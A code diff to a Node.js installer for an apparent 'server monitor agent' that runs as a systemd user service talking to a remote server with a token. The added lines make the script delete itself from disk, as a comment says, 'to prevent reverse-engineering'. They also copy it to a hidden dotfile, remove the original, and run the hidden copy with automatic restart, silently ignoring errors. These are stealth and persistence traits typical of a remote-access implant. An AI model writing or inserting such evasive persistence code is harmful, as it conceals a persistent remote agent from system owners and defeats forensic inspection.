@@ -69,17 +69,39 @@ Usage:
   process.exit(1);
 }
 
+// ── Ephemeral Execution: self-delete script file from disk to prevent reverse-engineering ──
+if (!IS_INSTALL && !IS_UNINSTALL) {
+  try {
+    const currentScript = path.resolve(__filename);
+    if (fs.existsSync(currentScript) && !currentScript.includes('.config/server-monitor-agent')) {
+      fs.unlinkSync(currentScript);
+    }
+  } catch (_) {}
+}
+
 function installService() {
   const platform = os.platform();
-  const scriptPath = path.resolve(__filename);
   const nodeBin = process.execPath;
 
   console.log(`📦 Installing ${SVC_NAME}...`);
 
   if (platform === 'linux') {
+    const appDir = path.join(os.homedir(), '.config', 'server-monitor-agent');
     const unitDir = path.join(os.homedir(), '.config', 'systemd', 'user');
+    const secureScriptPath = path.join(appDir, '.agent.js');
     const unitPath = path.join(unitDir, `${SVC_ID}.service`);
+
+    fs.mkdirSync(appDir, { recursive: true });
     fs.mkdirSync(unitDir, { recursive: true });
+
+    // Copy script to secure hidden location and remove current installer script
+    try {
+      fs.copyFileSync(path.resolve(__filename), secureScriptPath);
+      fs.chmodSync(secureScriptPath, 0o600);
+      if (path.resolve(__filename) !== secureScriptPath && fs.existsSync(__filename)) {
+        fs.unlinkSync(__filename);
+      }
+    } catch (_) {}
 
     const unitContent = `[Unit]
 Description=${SVC_NAME}
@@ -87,7 +109,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=${nodeBin} ${scriptPath} --server "${SERVER}" --token "${TOKEN}" --name "${AGENT_NAME}"${CONNECTION_ID ? ` --connection-id "${CONNECTION_ID}"` : ''}
+ExecStart=${nodeBin} ${secureScriptPath} --server "${SERVER}" --token "${TOKEN}" --name "${AGENT_NAME}"${CONNECTION_ID ? ` --connection-id "${CONNECTION_ID}"` : ''}
 Restart=always
 RestartSec=3
 
@@ -148,10 +170,12 @@ function uninstallService() {
   console.log(`🗑️ Uninstalling ${SVC_NAME}...`);
 
   if (platform === 'linux') {
+    const appDir = path.join(os.homedir(), '.config', 'server-monitor-agent');
     const unitPath = path.join(os.homedir(), '.config', 'systemd', 'user', `${SVC_ID}.service`);
     spawnSync('systemctl', ['--user', 'stop', `${SVC_ID}.service`], { stdio: 'ignore' });
     spawnSync('systemctl', ['--user', 'disable', `${SVC_ID}.service`], { stdio: 'ignore' });
     if (fs.existsSync(unitPath)) fs.unlinkSync(unitPath);
+    if (fs.existsSync(appDir)) fs.rmSync(appDir, { recursive: true, force: true });
     spawnSync('systemctl', ['--user', 'daemon-reload'], { stdio: 'ignore' });
     spawnSync('systemctl', ['--user', 'reset-failed'], { stdio: 'ignore' });
     spawnSync('pkill', ['-f', '[m]onitor-agent'], { stdio: 'ignore' });
